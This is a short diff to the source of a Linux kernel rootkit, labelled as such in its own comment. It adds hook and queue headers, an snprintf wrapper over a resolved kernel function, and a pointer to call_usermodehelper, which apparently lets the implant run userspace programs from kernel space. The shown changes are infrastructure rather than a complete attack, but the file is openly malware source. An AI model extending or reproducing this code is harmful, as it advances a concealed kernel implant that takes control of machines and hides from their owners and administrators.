@@ -46,6 +46,8 @@ LABEL(kernel_start)
 #include <asm/mman.h>
 
 #include "kernel.h"
+#include "hooks.h"
+#include "queue.h"
 
 #define LOG_LINE_MAX PAGE_SIZE
 
@@ -58,6 +60,7 @@ LABEL(kernel_start)
  */
 int pinfo(const char *fmt, ...);
 int perr(const char *fmt, ...);
+int snprintf(char *buf, size_t len, const char *fmt, ...);
 int vpfd(int fd, const char *fmt, va_list args);
 //void *readfile(const char *file, size_t *len);
 struct task_struct *get_current_task(void);
@@ -96,6 +99,7 @@ size_t (*f_strlen)(const char *) = NULL;
 int (*f_kstrtoull)(const char *s, unsigned int base, unsigned long long *res) = NULL;
 void * (*f_memcpy)(void *dest, const void *src, size_t count) = NULL;
 int (*f_memcmp)(const void *cs, const void *ct, size_t count) = NULL;
+int (*f_call_usermodehelper)(char *path, char **argv, char **envp, int wait) = NULL;
 
 /*
  * RootKit's functions definitions.
@@ -164,6 +168,16 @@ int perr(const char *fmt, ...) {
     ret = vpfd(2, fmt, args);
     va_end(args);
     return ret;
+}
+
+int snprintf(char *buf, size_t len, const char *fmt, ...) {
+	va_list args;
+	int ret;
+
+	va_start(args, fmt);
+	ret = f_vscnprintf(buf, len, fmt, args);
+	va_end(args);
+	return ret;
 }
 
 int vpfd(int fd, const char *fmt, va_list args) {
